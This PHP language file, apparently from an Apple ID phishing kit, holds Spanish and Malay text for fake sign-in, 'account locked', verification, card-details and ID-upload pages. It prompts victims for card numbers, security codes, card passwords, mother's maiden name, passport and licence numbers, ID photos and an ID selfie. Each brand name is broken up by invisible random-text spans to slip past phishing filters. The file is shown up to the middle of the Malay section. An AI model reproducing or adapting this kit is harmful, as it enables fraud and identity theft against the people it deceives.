<?php @error_reporting(0);
$lands = $_GET['country'];

function generhome($length = 10) {
    $chrtse = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $randoistrg = '';
    for ($i = 0; $i < $length; $i++) {
        $randoistrg .= $chrtse[rand(0, strlen($chrtse) - 1)];
    }
    return $randoistrg;
}

$gram = generhome(8);
$groot = generhome(13);
$froot = generhome(16);
$itoot = generhome(17);
$sinsg = generhome(11);

switch ($lands) {
// SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS
case "ES":
	// Front page	
	$nxt = "Siguiente";
    $TTLEZ = "Iniciar sesión";
	$SignIn = "Iniciar sesión";
	$Createapid = "Crea tu ID de <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>";
	$ForgotApple = "¿Olvidó su ID o contraseña de <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>?";
	$accounteverything = "Tu cuenta para todo <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>.";
	$services = "Un solo ID y contraseña de <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> le da acceso a todos los servicios de <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>.";
	$about = "Lee mas sobre Id <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>";
	$CreateApple = "Crea tu ID de <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>";
	$Shopthe = "Comprar el ";
	$OnlineStore = "Tienda Online de <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>";
	$visit = " visitar un ";
	$RetailStore = "Tienda de <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>";
	$find = " o encontrar un ";
	$reseller = "revendedores";
	$AppleInfo = "Información de <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>";
	$Map = "Mapa del sitio";
	$News = "Noticias";
	$Feeds = "RSS Feeds";
	$Contact = "Contáctenos";
	$rightsreserved = "Copyright © 2019 <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> Inc. Todos los derechos reservados.";
	$TermsUse = "Términos de Uso";
	$Policy = "Política de privacidad";
	
// Login page
	
	$accManageount = "Administra tu cuenta de <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> ID de <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>";
	$acApplecount = "Gestiona tu cuenta de <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>";
	$Password = "Contraseña";
	$Rmeemember = "Recuérdame";
	$morehelp = "Necesitas más ayuda? ";
	$Chatnow = "Chatea ahora";
	$M800YAPPLE = " o llame al <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>.";
	$cfasterheckout = "Inicia sesión para un pago más rápido.";
	$iCsaddressignloud = "Su ID de <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> es la dirección de correo electrónico que utiliza para iniciar sesión en <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$itoot</span>i<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$itoot</span>T<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$itoot</span>u<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>29dc13fd93be42de3a3f632dc2daf8ab</span>n<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$itoot</span>e<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$itoot</span>s</div>, App Store e <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>i<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>C<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>o<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>u<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>d</div>.";
	$ISignn = "Registrarse";
	$pForgotassword = "¿Olvidó su ID o contraseña de <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>? ¿Olvidó su ID o contraseña de <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>?";
	$unpassworddefined = "¿Olvidaste tu ID <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> o tu contraseña? indefinido";
	$Creatonee = "¿No tienes una identificación de <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>? Crear una ahora.";
	$haveCApplereate = "¿No tienes una identificación de <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>? Crear una ahora. indefinido";
	$IApplesD = "ID de <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>";
	$fAqqq = "FAQ"; // added new

// Lock	page

	$securityreasons = " Este ID de <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> ha sido bloqueado por razones de seguridad.";
	$beforesigning = "Debes desbloquear tu cuenta antes de iniciar sesión.";
	$UnlockAccount = "Desbloquear cuenta";
	
// Verify page

    $yourinformation = "Confirma tu informacion";
	$AccountVerification = "Verificación de la cuenta";
	$YourAppleID = "Tu ID de <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> es ";
	$OuSignt = "Desconectar ";
	$PersonalInformation = "Informacion personal";
	$NAME = "Nombre";
	$firstname = "nombre de pila";
	$middlename = "segundo nombre (Opcional)";
	$lastname = "apellido";
	$OFBIRTH = "FECHA DE NACIMIENTO";
	$dateobirth = "fecha de nacimiento";
	$TELEPHONE = "TELÉFONO";
	$ADDRESS = "DIRECCIÓN";
    $LineADDRESS = "dirección ";
	$city = "ciudad";
	$POSTCO = "CÓDIGO POSTAL";
	$AccountDetails = "detalles de la cuenta";
	$CARDDETAILS = "Detalles de tarjeta";
	$CAname = "Nombre del tarjetahabiente";
	$CAnumber = "número de tarjeta";
	$CAdater = "fecha de caducidad";
	$securitycode = "Código de Seguridad de la Tarjeta";
	$cardpassword = "contraseña vbv o contraseña de la tarjeta";
	$Security = "Seguridad";
	$SELECTQUESTION = "Seleccione una Pregunta de Seguridad";
	$securityquestion = "seleccione la pregunta de seguridad";
	$MaideNamen = "Nombre de soltera de la madre";
	$LicenseNumber = "Número de licencia de conducir";
	$PassportNumber = "Número de pasaporte";
	$answer = "responder";

// Id 1

	$IdentityVerification = "Verificación de identidad";
	$doIDcument = "1 - Subir fotos de ambos lados de su documento de identificación.";
	$residencedocument = "2 - Cargar prueba de residencia foto del documento";
	$couldyour = "Esto podría ser tu :";
	$billinternet = "Estado de cuenta bancario o factura de servicios públicos (factura eléctrica, factura del agua, factura de internet, etc.)";
	$Email = " Email";
	$fsidedocument = " - Anverso de su documento de identidad";
	$Backside = " - Reverso de su documento de identidad.";
	$residencephoto = " - Comprobante de residencia documento foto.";

// Id 2
    $sidespaymentcard = "Sube fotos de ambos lados de tu tarjeta de pago.&nbsp;";
	$Email = " Email";
	$FrontsideCard = " - Parte frontal de su tarjeta de pago";
	$syourideBack = " - Reverso de su Tarjeta de Pago.";
	$Email = "";
	$Email = "";
	
	$clearCard = "-por favor, cargue una foto clara de su tarjeta de identificación"; 
$takeselfie = "-usted debe sostener su identificación al lado de su cara y tomar un selfie"; 
$thenupload = "elige la foto y haz clic en cargar."; 
$uploadii = "cargar &rarr;"; 

// Fin

    $VerificationComplete = "Verificación de cuenta completa";
    $accessaccount = "Por favor, espere mientras restauramos el acceso a su cuenta ...";
    $automaticallylogged = "Para su seguridad será desconectado automáticamente. ";
	
	// Link Email

    $vverrmail = "Añada su dirección de correo electrónico.";
	$emaillsz = "Email";
	$VerificationComplete = "Verificación de cuenta completa";
	$wontsy = "<div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> no almacenará su contraseña.";
	$iCloud = "Iniciar sesión en <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>i<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>C<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>o<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>u<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>d</div>";
    $KeepMe = "Mantenerme registrado";
break;
   
case "MY":
$nxt = "Seterusnya";
	// Front page	
    $TTLEZ = "Log masuk";
	$SignIn = "Masuk";
	$Createapid = "Buat ID <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> anda";
	$ForgotApple = "Lupa ID atau kata laluan <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>?";
	$accounteverything = "Akaun anda untuk semua <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>.";
	$services = "ID dan kata laluan <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> tunggal memberikan anda akses kepada semua perkhidmatan <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>.";
	$about = "Ketahui lebih lanjut mengenai <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> ID&nbsp;";
	$CreateApple = "Buat <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> ID anda";
	$Shopthe = "Beli ";
	$OnlineStore = "Kedai Dalam Talian <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>";
	$visit = " melawat ";
	$RetailStore = "Kedai Runcit <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>";
	$find = " atau cari a ";
	$reseller = "reseller";
	$AppleInfo = "Maklumat <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>";
	$Map = "Peta Laman";
	$News = "Berita";
	$Feeds = "Suapan RSS";
	$Contact = "Hubungi Kami";
	$rightsreserved = "Hak cipta © 2019 <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> Inc. Hak cipta terpelihara.";
	$TermsUse = "Syarat Penggunaan";
	$Policy = "Dasar Privasi";
	
// Login page
	
	$accManageount = "Uruskan akaun <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> ID anda";
	$acApplecount = "Urus akaun <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> anda";
	$Password = "Kata laluan";
	$Rmeemember = "Ingat saya";
	$morehelp = "Perlu lebih banyak bantuan? ";
	$Chatnow = "Berbual sekarang";
	$M800YAPPLE = " atau hubungi <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>.";
	$cfasterheckout = "Log masuk untuk checkout lebih cepat.";
	$iCsaddressignloud = "ID <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> anda ialah alamat e-mel yang anda gunakan untuk melog masuk ke <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$itoot</span>i<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$itoot</span>T<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$itoot</span>u<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>29dc13fd93be42de3a3f632dc2daf8ab</span>n<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$itoot</span>e<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$itoot</span>s</div>, App Store, dan <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>i<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>C<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>o<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>u<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>d</div>.";
	$ISignn = "Masuk";
	$pForgotassword = "Lupa ID <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> atau kata laluan anda?";
	$unpassworddefined = "Lupa ID <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> atau kata laluan anda? undefined";
	$Creatonee = "Tidak mempunyai ID <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>? Buat satu sekarang.";
	$haveCApplereate = "Tidak mempunyai ID <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>? Buat satu sekarang. undefined";
	$IApplesD = "ID <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>";
	$fAqqq = "FAQ"; // added new

// Lock	page

	$securityreasons = " ID <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> ini telah dikunci kerana alasan keselamatan.";
	$beforesigning = "Anda mesti membuka kunci akaun anda sebelum melog masuk.";
	$UnlockAccount = "Buka Akaun";
	
// Verify page

    $yourinformation = "Sahkan maklumat anda";
	$AccountVerification = "Pengesahan akaun";
	$YourAppleID = "ID <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> anda ialah ";
	$OuSignt = "Keluar ";
	$PersonalInformation = "Maklumat peribadi";
	$NAME = "Nama";
	$firstname = "nama pertama";
	$middlename = "nama tengah (pilihan)";
	$lastname = "nama terakhir";
	$OFBIRTH = "TARIKH LAHIR";
	$dateobirth = "tarikh lahir";
	$TELEPHONE = "TELEFON";
	$ADDRESS = "ALAMAT";
    $LineADDRESS = "alamat Talian ";
	$city = "bandar";
	$POSTCO = "POSKOD";
	$AccountDetails = "Butiran Akaun";
	$CARDDETAILS = "Maklumat Kad";
	$CAname = "nama pemegang kad";
	$CAnumber = "nombor kad";
	$CAdater = "tarikh luput";
	$securitycode = "Kod Keselamatan Kad";
	$cardpassword = "Kata laluan vbv atau kata laluan kad";
	$Security = "Keselamatan";
	$SELECTQUESTION = "Pilih soalan keselamatan";
	$securityquestion = "pilih soalan keselamatan";
	$MaideNamen = "Nama Ibu";
	$LicenseNumber = "Nombor Lesen Memandu";
	$PassportNumber = "Nombor pasport";
	$answer = "jawapannya";

// Id 1

	$IdentityVerification = "Identity Verification";
	$doIDcument = "1 - Upload photos of both sides of your ID document.";
	$residencedocument = "2 - Upload Proof of residence document photo";
	$couldyour = "This could be your :";
	$billinternet = "Bank statement or Utility bill (electricity bill, water bill, internet bill, etc.)";
	$Email = " Email";
	$fsidedocument = " - Front side of your ID document";
